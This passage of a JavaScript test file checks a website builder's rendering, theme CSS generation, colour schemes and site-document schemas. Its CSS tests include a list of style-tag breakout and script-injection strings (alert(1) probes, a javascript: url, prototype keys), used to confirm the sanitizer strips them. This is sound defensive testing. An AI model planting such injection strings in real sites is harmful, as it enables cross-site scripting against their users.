	assert.equal((one.match(/<img/g) ?? []).length, 1, 'one tile')
	const holes = render('split-hero', { backdrop: [null, null, IMG_A, null, null] })
	assert.equal((holes.match(/<img/g) ?? []).length, 1)
	assert.ok(!/Image \d/.test(holes))
	const sample = render('split-hero', {})
	for (let n = 1; n <= 5; n++) assert.ok(sample.includes(`Image ${n}`), 'the untouched sample keeps its labelled tiles')
})

check('render: the split hero photo carries its label as alt text', () => {
	const labelled = render('split-hero', { mediaSrc: IMG_A, mediaLabel: 'Crew replacing a roof', backdrop: [] })
	assert.ok(/<img[^>]*alt="Crew replacing a roof"/.test(labelled))
	const unlabelled = render('split-hero', { mediaSrc: IMG_A, backdrop: [] })
	assert.ok(/<img[^>]*alt=""/.test(unlabelled) && !unlabelled.includes('Main Image'), 'no label: decorative, not "Main Image"')
	assert.ok(render('split-hero', { backdrop: [] }).includes('Main Image'), 'the empty slot keeps its label')
})

check('render: every hero carries the trim variables', () => {
	const heroes = [['page-hero', 'left'], ['page-hero', 'centered'], ['page-hero', 'compact'], ['split-hero'], ['stat-hero'], ['contact-split']]
	for (const [type, variant] of heroes) {
		const html = render(type, {}, variant)
		assert.ok(html.includes('--hero-trim,0rem') && html.includes('--hero-trim-lg,0rem'), `${type} ${variant ?? ''}`)
	}
	assert.ok(render('page-hero', {}, 'compact').includes('pt-[calc(7rem-var(--hero-trim,0rem))]'))
	assert.ok(render('page-hero', {}).includes('pt-[calc(9rem-var(--hero-trim,0rem))]'))
})

check('render: prose links and callout bodies are styled', () => {
	const prose = render('prose-block', { body: '<p>See <a href="/x">this</a></p>' })
	assert.ok(prose.includes('[&amp;_a]:underline'), 'prose links at any depth')
	const callout = render('callout', { body: '<p>One</p><ul><li>Two</li></ul>' })
	assert.ok(callout.includes('[&amp;&gt;*+*]:mt-3') && callout.includes('[&amp;_ul]:list-disc'), 'callout html body')
	const marquee = render('marquee', {})
	assert.ok(marquee.includes('motion-reduce:animate-none') && marquee.includes('motion-reduce:hidden'), 'the marquee stands still on request')
})

check('fonts: a display face falls back to sans-serif, a handwriting face to cursive', () => {
	const display = googleFonts.find((font) => font.category === 'Display')
	const hand = googleFonts.find((font) => font.category === 'Handwriting')
	assert.ok(fontStack(display.family).endsWith(', sans-serif'), display.family)
	assert.ok(fontStack(hand.family).endsWith(', cursive'), hand.family)
	assert.equal(fontStack('Not A Font'), 'sans-serif')
})

// ---- CSS -----------------------------------------------------------------------

const EVIL = [
	"x'] {}</style><script>alert(1)</script>",
	'</style><script>alert(1)</script>',
	"a'] > *, body{background:url(javascript:alert(1))} [x='",
	'<!--',
	'a b',
	'a'.repeat(41),
	'__proto__',
	'constructor',
]

check('css: block keys and values built to break out produce no "<"', () => {
	const evilSurface = {
		page: { pattern: '</style><script>', fill: '</style>', color: { token: '<x>', lightness: '<1>' }, patternColor: '</style>' },
		menu: '</style>',
		panelGlow: { mode: '</style>', size: '</style>' },
		scheme: '</style>',
	}
	const blocks = Object.fromEntries(EVIL.map((key) => [key, evilSurface]))
	blocks.blk_ok = { ...clone(defaultBackground), scheme: 'inverse' }
	const look = { theme: { background: '</style>', headingFont: "x'</style>", radius: '</style>', maxWidth: '<x>' }, page: evilSurface, header: evilSurface, footer: evilSurface, blocks }
	const css = lookCss(look)
	assert.ok(!css.includes('<'), 'no < in lookCss')
	assert.ok(css.includes("[data-block-id='blk_ok'] > *"), 'the valid block still paints')
	for (const key of EVIL) if (key !== '__proto__' && key !== 'constructor') assert.ok(!css.includes(`[data-block-id='${key}']`), key)
	// Even an unsanitized call cannot write a "<": every injected stylesheet passes cssText.
	assert.ok(!themeCss({ ...defaultSettings, buttonFill: 'gradient', buttonFrom: { token: '</style>', lightness: 0 } }).includes('<'))
	assert.ok(!backgroundCss({ ...clone(defaultBackground), page: { ...clone(defaultBackground.page), pattern: '</style><script>' } }).includes('<'))
})

check('css: backgroundCss writes nothing for a scope that is not a block', () => {
	const surface = clone(defaultBackground)
	for (const scope of ["[data-block-id='x'] > *, body", 'body', '', "[data-block-id='a b'] > *", "[data-block-id='x'] > * {} <", "[data-block-id='x']", "html [data-block-id='x'] > *", `[data-block-id='${'a'.repeat(41)}'] > *`])
		assert.equal(backgroundCss(surface, 'page', false, scope), '', JSON.stringify(scope))
	assert.ok(backgroundCss(surface, 'page', false, "[data-block-id='blk_a1'] > *").startsWith("[data-block-id='blk_a1'] > *{"))
})

const LIGHT = { ...defaultSettings, background: '#fbfaf7', accent: '#1e3a8a', heading: '#0b1220', body: '#1e293b' }
const band = (scheme) => ({ ...clone(globalBackground), scheme, page: { ...clone(globalBackground.page), fill: 'solid', color: { token: 'background', lightness: 0 } } })

check('css: inverse and brand bands declare their tokens before their surface, once per scheme', () => {
	const look = sanitizeLook({
		theme: LIGHT,
		blocks: { blk_a: band('inverse'), blk_b: band('brand'), blk_c: { page: { fill: 'solid' } }, blk_d: band('inverse'), blk_e: band('inverse') },
		footer: band('inverse'),
	})
	const css = lookCss(look, { blockIds: ['blk_a', 'blk_b', 'blk_c', 'blk_d'] })
	const inverse = css.indexOf("[data-block-id='blk_a'] > *, [data-block-id='blk_d'] > *{--color-ink:var(--sch-inv-bg);")
	const brand = css.indexOf("[data-block-id='blk_b'] > *{--color-ink:var(--sch-brand-bg);")
	assert.ok(inverse !== -1 && brand !== -1, 'one rule per scheme, listing its blocks')
	assert.ok(inverse < css.indexOf("[data-block-id='blk_a'] > *{position:relative"), 'inverse tokens before the surface')
	assert.ok(inverse < css.indexOf("[data-block-id='blk_d'] > *{position:relative"))
	assert.ok(brand < css.indexOf("[data-block-id='blk_b'] > *{position:relative"), 'brand tokens before the surface')
	assert.equal(css.split('--color-ink:var(--sch-inv-bg)').length - 1, 2, 'inverse tokens written for the footer and once for the blocks')
	assert.ok(!css.includes('blk_e'), 'blocks of other pages are left out')
	const footer = css.indexOf("html [data-surface='footer']{--color-ink:var(--sch-inv-bg);")
	assert.ok(footer !== -1 && footer < css.indexOf("html [data-surface='footer']{position:relative"), 'the footer band')
	// Inside a band: colours only, the band's hover fill, and solid primary buttons.
	const rule = css.slice(inverse, css.indexOf('}', inverse))
	assert.ok(!/--font-|--content-max|--radius/.test(rule), 'no fonts, measure or radius in a band')
	assert.ok(rule.includes('--color-brand-strong:var(--sch-inv-strong);') && rule.includes('--shadow-ink:var(--sch-inv-shadow);'))
	assert.ok(css.includes("[data-block-id='blk_a'] > * [data-slot='button'].bg-brand, [data-block-id='blk_a'] > * [data-slot='button'].bg-brand:hover"), 'solid buttons in a band')
	// backgroundCss alone (the canvas path) carries the tokens too, before the surface.
	const single = backgroundCss(band('brand'), 'page', false, "[data-block-id='blk_b'] > *")
	assert.ok(single.indexOf('--color-ink:var(--sch-brand-bg)') < single.indexOf('position:relative'))
	// A band with no paint of its own still paints the band.
	const unpainted = backgroundCss({ ...clone(globalBackground), scheme: 'inverse' }, 'page', false, "[data-block-id='x1'] > *")
	assert.ok(unpainted.includes("[data-block-id='x1'] > *{position:relative;isolation:isolate;overflow:hidden;overflow:clip;background-color:var(--color-ink)"))
	// The header and the page backdrop have no scheme.
	assert.ok(!backgroundCss(band('inverse'), 'header', false).includes('--sch-'))
	assert.ok(!backgroundCss(band('inverse')).includes('--sch-'))
})

check('css: the root carries the derived band colours and their hover fills', () => {
	const css = themeCss(LIGHT)
	const colors = { background: LIGHT.background, accent: LIGHT.accent, heading: LIGHT.heading, body: LIGHT.body }
	for (const [scheme, prefix] of [['inverse', 'inv'], ['brand', 'brand']]) {
		const derived = deriveScheme(colors, scheme)
		assert.ok(css.includes(`--sch-${prefix}-bg:${derived.background};`), `${scheme} bg`)
		assert.ok(css.includes(`--sch-${prefix}-accent:${derived.accent};`))
		assert.ok(css.includes(`--sch-${prefix}-heading:${derived.heading};`))
		assert.ok(css.includes(`--sch-${prefix}-body:${derived.body};`))
		assert.ok(css.includes(`--sch-${prefix}-strong:${schemeStrong(colors, scheme)};`), `${scheme} strong`)
	}
	// A light site's inverse band is dark, so its shadows are black.
	assert.ok(css.includes('--sch-inv-shadow:rgb(0 0 0);') && css.includes('--shadow-ink:rgb(15 23 42 / 0.28);'))
})

check('css: --radius per shape', () => {
	const want = { sharp: ['0.25rem', '0.5rem', '0.75rem'], soft: ['0.625rem', '1rem', '1.5rem'], round: ['1rem', '1.5rem', '2rem'] }
	for (const [shape, [radius, xl2, xl3]] of Object.entries(want))
		assert.ok(themeCss({ ...defaultSettings, radius: shape }).includes(`--radius:${radius};--radius-2xl:${xl2};--radius-3xl:${xl3};`), shape)
	const { radius, ...old } = defaultSettings
	assert.ok(themeCss(old).includes('--radius:0.625rem;'), 'a look saved before shapes is soft')
})

check('css: the hover fill mixes toward black on light themes, toward white on dark ones', () => {
	assert.ok(themeCss(LIGHT).includes('--color-brand-strong:color-mix(in srgb, #1e3a8a 78%, black);'))
	assert.ok(themeCss(defaultSettings).includes('--color-brand-strong:color-mix(in srgb, #0197f6 78%, white);'))
	assert.ok(themeCss(defaultSettings).includes('--shadow-ink:rgb(0 0 0);'))
})

check('css: blocks clip with overflow: clip, the footer with hidden', () => {
	const block = backgroundCss(clone(defaultBackground), 'page', false, "[data-block-id='b1'] > *")
	assert.ok(/\[data-block-id='b1'\] > \*\{[^}]*overflow:clip;/.test(block))
	assert.ok(block.lastIndexOf('overflow:clip') > block.indexOf("[data-block-id='b1'] > *{"), 'clip is the effective value')
	const footer = backgroundCss({ ...clone(defaultBackground) }, 'footer', false)
	assert.ok(/html \[data-surface='footer'\]\{position:relative;isolation:isolate;overflow:hidden;background/.test(footer))
	assert.ok(!footer.includes('overflow:clip'))
})

check('css: the header paints its decorative layer, never the bar itself', () => {
	const header = { ...clone(globalBackground), page: { ...clone(defaultBackground.page), fill: 'solid', pattern: 'grid' } }
	const css = backgroundCss(header, 'header', false)
	assert.ok(css.includes("html [data-surface='header'] [data-surface-layer], html [data-surface='header'][aria-hidden]{background-color:"))
	assert.ok(css.includes("html [data-surface='header'] [data-surface-layer]::before, html [data-surface='header'][aria-hidden]::before{"))
	assert.ok(!/html \[data-surface='header'\]\{/.test(css), 'no rule on the header element')
})

// Three looks saved before schemes, shapes and the header layer existed. Their stylesheet
// from rendered-site.tsx at commit 9492a04 (theme.ts and builder-context.tsx's mergeLook as
// they were) hashes to these values; the new one, with only the intended changes undone,
// must hash the same.
const SAVED_LOOKS = {
	default: [{}, '192f16d47221150e35c3010fefeb1a107e9bc502d4d19ec4a9d658d955d754e2'],
	dark: [
		{
			theme: { background: '#0b0b0c', accent: '#d4a64a', heading: '#f6f1e7', body: '#cdc5b6', headingFont: 'Playfair Display', bodyFont: 'Source Sans 3', maxWidth: '5xl', buttonFill: 'gradient', buttonFrom: { token: 'accent', lightness: 0 }, buttonTo: { token: 'accent', lightness: 25 }, buttonAngle: 135 },
			page: { page: { pattern: 'dots', patternAngle: 0, patternColor: { token: 'accent', lightness: 0 }, fill: 'gradient', gradientAngle: 160, color: { token: 'background', lightness: 0 }, from: { token: 'accent', lightness: -50 }, to: { token: 'background', lightness: 0 } }, megaMenu: true, menu: { pattern: 'none', patternAngle: 0, patternColor: { token: 'accent', lightness: 0 }, fill: 'solid', gradientAngle: 135, color: { token: 'background', lightness: 7 }, from: { token: 'accent', lightness: 0 }, to: { token: 'background', lightness: 7 } }, panelGlow: { mode: 'accent', lightness: 0, size: 'md' }, featureGlow: { mode: 'accent', lightness: 0, size: 'sm' } },
			header: { page: { pattern: 'grid', fill: 'solid', color: { token: 'background', lightness: 6 } }, panelGlow: { mode: 'heading', lightness: 20, size: 'lg' } },
			footer: { page: { pattern: 'crosshatch', patternAngle: 45, fill: 'gradient', gradientAngle: 90, from: { token: 'accent', lightness: -60 }, to: { token: 'background', lightness: 4 } } },
			blocks: {
				blk_hero01: { page: { fill: 'solid', color: { token: 'accent', lightness: -82 } } },
				a1b2c3: { page: { pattern: 'rings', patternAngle: 30 } },
			},
		},
		'4473df49d4e06915b3615d3364d8b8c9ff0c495e872ec7d17fd1191c704a1abc',
	],
	light: [
		{
			theme: { background: '#fbfaf7', accent: '#1e3a8a', heading: '#0b1220', body: '#1e293b', headingFont: 'Fraunces', bodyFont: 'Inter', maxWidth: '7xl', buttonFill: 'solid', buttonFrom: { token: 'accent', lightness: 0 }, buttonTo: { token: 'accent', lightness: -20 }, buttonAngle: 90 },
			page: { page: { pattern: 'none', patternAngle: 0, patternColor: { token: 'heading', lightness: 0 }, fill: 'solid', gradientAngle: 135, color: { token: 'background', lightness: 0 }, from: { token: 'accent', lightness: 0 }, to: { token: 'background', lightness: 0 } } },
			header: { page: { pattern: 'none', fill: 'solid', color: { token: 'background', lightness: 0 } }, menu: { fill: 'solid', color: { token: 'background', lightness: 0 }, to: { token: 'background', lightness: 0 } }, panelGlow: { mode: 'heading', lightness: 60, size: 'lg' }, featureGlow: { mode: 'accent', lightness: 40, size: 'sm' } },
			footer: { page: { pattern: 'none', fill: 'global', color: { token: 'background', lightness: 0 } } },
			blocks: {
				blk_1a2b3c4d5e: { page: { pattern: 'grid', fill: 'gradient', gradientAngle: 135, from: { token: 'accent', lightness: 82 }, to: { token: 'background', lightness: 70 } } },
				intro_2: { page: { fill: 'transparent' }, menu: { fill: 'gradient' } },
			},
		},
		'e0de8ec0bb678ee3a39da9cfd7067dc9979916b24d16e56e842b900e118afe87',
	],
}

/** Undoes exactly the intended changes: new variables, the light hover fill, block clipping, the header layer. */
const asBefore = (css) =>
	css
		.replace(/--shadow-ink:[^;]*;|--radius:[^;]*;|--radius-2xl:[^;]*;|--radius-3xl:[^;]*;|--sch-[a-z]+-[a-z]+:[^;]*;/g, '')
		.replace(/(--color-brand-strong:color-mix\(in srgb, #[0-9a-f]{6} 78%, )black\)/g, '$1white)')
		.replace(/overflow:hidden;overflow:clip;/g, 'overflow:hidden;')
		.replace(/html \[data-surface='header'\] \[data-surface-layer\]::before, html \[data-surface='header'\]\[aria-hidden\]::before/g, "html [data-surface='header']::before")
		.replace(/html \[data-surface='header'\] \[data-surface-layer\], html \[data-surface='header'\]\[aria-hidden\]/g, "html [data-surface='header']")

check('css: three saved looks render as before, apart from the added variables', () => {
	for (const [name, [saved, hash]] of Object.entries(SAVED_LOOKS)) {
		const css = lookCss(sanitizeLook(saved))
		assert.equal(crypto.createHash('sha256').update(asBefore(css)).digest('hex'), hash, name)
		assert.ok(!css.includes('--sch-inv-bg)'), `${name}: no band tokens without a band`)
	}
	assert.equal(lookCss(defaultLook()), lookCss(sanitizeLook({})))
})

// ---- the stored site -------------------------------------------------------------

check('site-doc: a PATCH body stores a sanitized look', () => {
	const body = {
		rev: 3,
		look: {
			theme: { accent: 'red', radius: 'round' },
			blocks: { "x'] {}</style><script>alert(1)</script>": { page: { fill: 'solid' } }, ok_1: { page: { fill: 'solid' }, scheme: 'brand' } },
			header: { scheme: 'inverse' },
		},
	}
	const parsed = sitePatchSchema.safeParse(body)
	assert.ok(parsed.success)
	assert.deepEqual(Object.keys(parsed.data.look.blocks), ['ok_1'])
	assert.equal(parsed.data.look.blocks.ok_1.scheme, 'brand')
	assert.equal(parsed.data.look.header.scheme, undefined, 'no scheme on the header')
	assert.equal(parsed.data.look.theme.accent, defaultSettings.accent)
	assert.equal(parsed.data.look.theme.radius, 'round')
	assert.ok(!lookCss(parsed.data.look).includes('<'))
	assert.equal(sitePatchSchema.safeParse({ rev: 3 }).data.look, undefined, 'a body without a look leaves it alone')
	assert.ok(!sitePatchSchema.safeParse({ rev: 3, look: 'junk' }).success)
})

check('site-doc: media entries take optional pixel dimensions', () => {
	const entry = { id: 'md_1', name: 'a.webp', url: 'https://x.public.blob.vercel-storage.com/a.webp', pathname: 'a.webp', bytes: 10, contentType: 'image/webp', addedAt: '2026-10-25T00:00:00.000Z' }
	assert.deepEqual(mediaEntrySchema.parse(entry), entry)
	assert.equal(mediaEntrySchema.parse({ ...entry, width: 1280, height: 720 }).width, 1280)
	for (const bad of [0, -1, 1.5, 20001, '640', null]) {
		const parsed = mediaEntrySchema.parse({ ...entry, width: bad, height: bad })
		assert.equal(parsed.width, undefined, String(bad))
		assert.equal(parsed.height, undefined, String(bad))
	}
})

if (failed) {
	console.log(`\n${failed} kit checks failed`)
	process.exit(1)
}
console.log('\nkit checks passed')
